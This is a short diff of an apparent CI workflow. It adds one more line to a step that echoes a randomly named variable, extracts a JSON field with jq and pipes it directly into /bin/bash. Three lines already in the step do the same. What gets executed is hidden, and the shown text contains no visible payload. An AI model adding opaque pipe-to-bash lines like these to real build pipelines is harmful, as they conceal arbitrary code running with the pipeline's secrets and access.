@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$lp3808" | jq -r .rd864 | /bin/bash
           echo $hv96419 | jq -r .r33 | /bin/bash
           echo $s7185 | jq -r .oab288 | /bin/bash
+          echo $i491 | jq -r .ekza68932 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
